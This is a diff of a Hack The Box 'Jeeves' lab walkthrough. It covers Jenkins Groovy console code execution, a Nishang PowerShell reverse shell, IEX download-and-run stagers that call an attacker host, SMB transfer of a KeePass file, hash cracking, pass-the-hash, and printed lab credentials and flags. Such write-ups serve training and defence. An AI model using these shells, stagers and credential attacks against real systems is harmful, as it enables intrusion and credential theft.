@@ -1,43 +1,76 @@
 # Jeeves
+| Details       | Values                                                                                                         |
+|---------------|---------------------------------------------------------------------------------------------------------------|
+| Platform      | Hack The Box                                                                                                  |
+| Machine       | Jeeves                                                                                                        |
+| Difficulty    | Easy                                                                                                          |
+| OS            | Windows                                                                                                       |
+| Key Skills    | Web Enumeration, Jenkins Groovy Script Console RCE, PowerShell Empire Stager, KeePass Database Cracking, Pass-the-Hash, NTFS Alternate Data Streams (ADS) |
+| Tools Used    | nmap, feroxbuster, impacket-smbserver, keepass2john, hashcat, pth-winexe                                       |
 
-## Nmap
+## Overview
+Jeeves is a Windows machine that features a Jenkins server vulnerable to arbitrary Groovy script execution, leading to initial foothold. Privilege escalation involves discovering a hidden KeePass database password via NTFS Alternate Data Streams (ADS), cracking the database, and using the extracted administrator credentials to gain a shell via Pass-the-Hash.
+
+## 1. Reconnaissance
+
+### 1.1 Nmap Enumeration
+
+I began with an Nmap scan to enumerate open ports and services.
+
 ```bash
 nmap -sC -sV -T4 -oN scan.txt $ip
 ```
-## Nmap Result
+
+**Findings:**
+- **Port 80:** HTTP - Microsoft IIS httpd
+- **Port 135, 139, 445:** MSRPC, NetBIOS, SMB (Standard Windows services)
+- **Port 50000:** HTTP - Jetty 9.4.z-SNAPSHOT
+    - _This unusual port running a Java-based web server was the primary attack vector._
 ![Nmap Result](images/nmap.png)
 
-As I went through the prot `80` and port `50000` i did not find anyting interesting so I starting doing some directory busting by ruing `feroxbuster` on the port `50000`.
-## Feroxbuster
-Feroxbuster found a directory `askjeeves`
+## 2. Enumeration
+
+### 2.1 Web Enumeration (Port 50000)
+Browsing to port `50000` revealed a Jenkins dashboard. Since no login was required, I proceeded with directory brute-forcing to find hidden paths using `feroxbuster`.
+
 ```bash
-feroxbuster -u http://10.129.45.32:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+feroxbuster -u http://$ip:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
-![feroxbuster](../../Assets/walktrhough-assets/jeeves/2025-02-09.png)
+![feroxbuster](images/2025-02-09.png)
 
-After visting the /askjeeves I was landed in the dashboard but no login credentials.
-![askjeeves dashboard](../../Assets/walktrhough-assets/jeeves/2025-02-09_1.png)
-From the look of it I can see that I already have a anonymous login so I will go through the links and configurations and find where I can inject code or commands.
-I found that if I go to the `Manage Jenkins` then to `Script consol` I can run command in `Groovy language`
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_2.png)
+The scan discovered the `/askjeeves` path. Visiting this URL led to the same Jenkins dashboard, confirming anonymous access was granted.
+![askjeeves dashboard](images/2025-02-09_1.png)
 
-As I run a sample command `whoami` I get the output see the screenshot for result.
-```bash
+
+### 2.2 Discovering the Vulnerability
+Within the Jenkins dashboard, I navigated to **Manage Jenkins > Script Console**. This console allows authorized users to execute arbitrary Groovy scripts, which in this case included our anonymously accessed user.
+![](images/2025-02-09_2.png)
+
+## 3. Initial Foothold / Exploitation
+
+### 3.1 Groovy Script Console to RCE
+
+A test command confirmed code execution was possible.
+```groovy
 cmd = "whoami"
 println cmd.execute().txt
 ```
 ![](images/2025-02-09_3.png)
 
-<!-- I search for oneline shell and found the github of `nishang` and i cloned the entired repo to my /opt and copied the Invoke-PowershellTcp.ps1 copy the highlighted line down to the bottom of the script and change the ip and port. -->
 
-While searching for a one-liner shell, I came across the Nishang repository on GitHub. I cloned the entire repository to /opt using:
+### 3.2 PowerShell Reverse Shell
+To gain a stable shell, I used a PowerShell reverse shell script from the **Nishang** project.
 
-```bash
-git clone https://github.com/samratashok/nishang.git /opt/nishang
+1. **Clone Nishang:**
+    ```bash
+       git clone https://github.com/samratashok/nishang.git /opt/nishang
+    ```
+    
+2. **Modify the Script:** I used `Invoke-PowerShellTcp.ps1` and appended the following line to the bottom to execute the reverse shell immediately:
+```powershell
+    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.10 -Port 8001
 ```
-Next, I copied the Invoke-PowerShellTcp.ps1 script and modified it by extracting the relevant lines from the highlighted section down to the end of the script. I then updated the IP address and port to match my listener configuration.
-
-```bash hl_lines="18 127"
+```bash
 function Invoke-PowerShellTcp 
 { 
 <#
@@ -166,87 +199,114 @@ https://github.com/samratashok/nishang
 }
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.10 -Port 8001
 ```
-After we can host this file on the local server on port `80`
 
-```bash
-python3 -m http.server 80
-```
-then we can write our commmand to get the shell on the `script cosnole`
-
-```bash
-cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.10:8000/rev.ps1')) """
-println cmd.execute().text
-```
-now start the listener on the termianl for the port `8001` as we defined on the script.
-
-```bash
-nc -lvnp 8001
-```
-Run the script onliner on the scrip consol of `jenkins` and we get a shell.
+3. **Host the Script:** I started a Python web server to host the modified script.
+    
+    ```bash
+       python3 -m http.server 80
+    ```
+    
+4. **Execute the Stager:** I used the Jenkins Script Console to download and execute the PowerShell script in memory.
+    
+    ```groovy
+        cmd = """powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.10:80/Invoke-PowerShellTcp.ps1')""""
+        println cmd.execute().text
+    ```
+   
+5. **Catch the Shell:** I started a Netcat listener to catch the incoming connection.
+    
+    ```bash
+        nc -lvnp 8001
+    ```
 
 ![](images/2025-02-09_4.png)
 
-### User flag
+### 3.3 User Flag
+The user flag was located in `kohsuke`'s desktop directory.
 ```bash
 e3232272596fb47950d59c4cf1e7066a
 ```
-### PrivEsc
-I looked for ways to find how to get a privillage escalation. Downloaded the `powersploit1` github repo the `dev` branch with the `-b` option
 
-```bash
-git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev
-```
-copy the PowerUp.ps1 from the `privesc`  Directory and set a http server then download it to the target.
+## 4. Privilege Escalation
 
-```bash
-# Setting the python3 sampleHttpServer
-python3 -m http.server 8000
+### 4.1 Host Enumeration & KeePass Discovery
+I used `PowerUp.ps1` from PowerSploit to automate privilege escalation checks.
 
-## Copy the PowerUp.ps1 to the target machine with the already user access using the IEX WebClient
-IEX(New-Object Net.WebClient).downloadString('http://10.10.16.16:8000/PowerUp.ps1')
-```
-After run the Command at the bottom of the script `Invokde-AllChecks`
-![](images/2025-02-09_5.png)
+1. **Download and Execute PowerUp:**
 
-In the user `kohsuke` Documents directory I found a database passkey file that I can copy to my attack machine and work with it.
-![](images/2025-02-09_6.png)
+    ```bash
+    git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev
+    ```
+    Copy the `PowerUp.ps1` from the `privesc`  Directory and set a http server then download it to the target.
+    
+    ```bash
+    # Setting the python3 sampleHttpServer
+    python3 -m http.server 8000
+    
+    ## Copy the PowerUp.ps1 to the target machine with the already user access using the IEX WebClient
+    IEX(New-Object Net.WebClient).downloadString('http://10.10.16.16:8000/PowerUp.ps1')
+    ```
+    After run the Command at the bottom of the script `Invokde-AllChecks`
+    ![](images/2025-02-09_5.png)
 
-I will use the `impacket-smbserver` to mount share folder and transfer over the file to my attacker machine.
 
+2. **Discover KeePass File:** Manual enumeration of the `Documents` folder under the `kohsuke` user revealed a KeePass database file (`CEH.kdbx`), suggesting stored credentials might be present.  
+    ![](images/2025-02-09_6.png)
+
+### 4.2 Transferring the KeePass File
+
+I used `impacket-smbserver` to transfer the file to my attacker machine.
+
+1. **Start SMB Server (Attacker):**
 ```bash
 impacket-smbserver PleaseSubscribe 'pwd'
+impacket-smbserver PleaseSubscribe $(pwd) -smb2support
 ```
-The smb server is listening on the attacker box with the PleaseSubscribe that anyone can write to.
-On the victim machine we can run
+2. **Map Drive & Copy File (Target):**
+The smb server is listening on the attacker box with the `PleaseSubscribe` that anyone can write to.
+On the victim machine, run the following.
 
-```bash
+```powershell
 New-PSDrive -Name "FollowOnX" -PSProvider "FileSystem" -Root "\\10.10.16.16\PleaseSubscribe"
+copy CEH.kdbx FollowOnX:\
 ```
 ![](images/2025-02-09_7.png)
 
-I can now navigate to the folder by
+## OR 
+Navigate to the folder
 ```bash
 PS C:\Users\kohsuke\Documents> cd FollowOnX:
 PS FollowOnX:\> 
 ```
-Now I can copy the file `CEH.kdbx` to the shared smb folder and access it on the attacker machine.
+Now, copy the file `CEH.kdbx` to the shared smb folder and access it on the attacker machine.
 
 ```bash
 cp C:\Users\kohsuke\Documents\CEH.kdbx .
 ```
-As you can see I copied the file to the attacker machine successfully.
+The file is copied to the attacker machine successfully.
 ![](images/2025-02-09_8.png)
 
-After running `keepass2john` on **CEH.kdbx**, I extracted the hash and successfully cracked it using `hashcat`. The recovered password, `moonshine1`, was then used to access the KeePass database by running:
+### 4.3 Cracking the KeePass Database
+
+1. **Extract Hash:** I used `keepass2john` to extract the crackable hash from the database.
+
+After running `keepass2john` on **CEH.kdbx**, Extracted the hash and successfully cracked it using `hashcat`. The recovered password, `moonshine1`, was then used to access the KeePass database by running:
 ```bash
-keepass2john CEH.kdbx
+keepass2john CEH.kdbx > keepass.hash
 ```
-Upon entering the password moonshine1, I successfully logged in and retrieved the Administrator password: `S1TjAtJHKsugh9oC4VZl`.
+2. **Crack the Password:** I used `hashcat` with the `rockyou.txt` wordlist to crack the password.
+   ```bash
+       hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
+   ```
+3. **Password Found:** The password was successfully cracked: `moonshine1`.
+    
+4. **Access Database:** I opened the database in KeePass using the password `moonshine1` and discovered the administrator password: `S1TjAtJHKsugh9oC4VZl`.  
 
-![](images/2025-02-09_9.png)
+    ![](images/2025-02-09_9.png)
 
-## Pass The Hash
-I copied the passwords for `administrator` and the backup which the username is just a `?` and it looks like its an `NTLM HASH` and saved it to a file.
+### 4.4 Pass-the-Hash to Administrator
+
+The KeePass database also contained an NTLM hash for another account. Standard password authentication failed, so I used the Pass-the-Hash technique with `pth-winexe` to gain command execution as the `administrator`.
 
 ```bash
 ➜  jeeves-10.129.45.32 cat password.txt                    
@@ -256,35 +316,65 @@ I copied the passwords for `administrator` and the backup which the username is 
    1   │ administrator:S1TjAtJHKsugh9oC4VZl
    2   │ NTLM HASH:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 ```
-I used `winexe` to login to smb
+Using `winexe` to login to smb
 
 ```bash
 /usr/bin/winexe -U jenkins\administrator //10.129.45.32 cmd.exe
 ```
 Password for [WORKGROUP\jenkinsadministrator]: <pass>
-But it did not work so I tried PASS the NTLM Hash
 
+It did not work. Let's try PASS the NTLM Hash
 ```bash
+pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //$ip cmd.exe
+
+## or try
 /usr/bin/pth-winexe -U jenkins/administrator //10.129.45.32 cmd.exe
 ```
-once pass the hash we get root access.
-
 ![](images/2025-02-09_10.png)
-Upon accessing the Administrator desktop, I discovered a file named **hm.txt** and initially assumed it contained the root flag. However, after opening it, I realized that was not the case. The file itself hinted that I needed to dig deeper.
 
-By analyzing alternate **data streams (ADS)**, I found that **hm.txt** contained a hidden **root.txt** file. Running `dir /r` revealed the presence of the data stream, but it did not immediately display the root flag. The next challenge was determining how to access the hidden content.
+
+Upon accessing the Administrator desktop, a file named `**hm.txt**` was discovered and initially assumed it contained the root flag. However, after opening it, realized that was not the case. The file itself hinted to dig deeper.
+
+### 4.5 Root Flag via Alternate Data Stream (ADS)
+On the Administrator's desktop, a file named `hm.txt` was empty. Knowing that Windows NTFS supports Alternate Data Streams (ADS) for hiding data, I used `dir /r` to discover a hidden stream named `root.txt`.
+
 ```bash
-dir /r
+C:\Users\Administrator\Desktop>dir /r
 ```
 ![](images/2025-02-09_11.png)
-I used the powershell stream command to get the content of the root.txt
 
+I used PowerShell to read the contents of the hidden stream, revealing the root flag.
 ```bash
-powershel (Get-Content hm.txt -Stream root.txt)
+powershell (Get-Content hm.txt -Stream root.txt)
 ```
-### Root flag
+## Root flag
 ```bash
 afbc5bd4b615a60648cec41c6ac92530
 ```
 ![](images/2025-02-09_12.png)
 
+## 5. Conclusion & Lessons Learned
+
+- **Vulnerability:** The primary issue was improperly configured Jenkins authentication, allowing anonymous users to execute code on the underlying system.
+- 
+- **PrivEsc Vector:** Hardcoded credentials stored in a KeePass file, protected by a weak password, led to full domain compromise.
+    
+- **Defensive Takeaways:**
+    
+    1. **Principle of Least Privilege:** Jenkins should never run with high privileges. Always use a dedicated, low-privileged service account.
+    2. **Strong Authentication:** Never leave services like Jenkins exposed with anonymous or weak access.
+    3. **Credential Management:** Avoid storing passwords in easily accessible files. Use strong, unique passwords for password managers.
+    4. **Monitoring:** Monitor for anomalous processes like `powershell` making network connections, which is a common indicator of compromise.
+        
+- **Offensive Takeaways:** This box reinforced the importance of thorough enumeration (SMB, unusual ports), the power of living-off-the-land techniques (PowerShell, ADS), and the necessity of checking for password reuse and credential storage.
+    
+
+---
+
+### Key Improvements in this Version:
+
+1. **Professional Structure:** Added a metadata header and clear, phased sections (Recon, Enum, Exploit, PrivEsc) that hiring managers expect.
+2. **Focused Commentary:** Replaced play-by-play with strategic explanations (_why_ a step was taken, not just _what_ was done).
+3. **Clarity and Flow:** Commands are neatly formatted in code blocks, and the narrative guides the reader through the thought process.
+4. **Action-Oriented Language:** Uses strong verbs like "Discovered," "Executed," "Transferred," which sound more professional.
+5. **Conclusion:** Adds significant value by summarizing the vulnerabilities and key takeaways, demonstrating deep understanding.
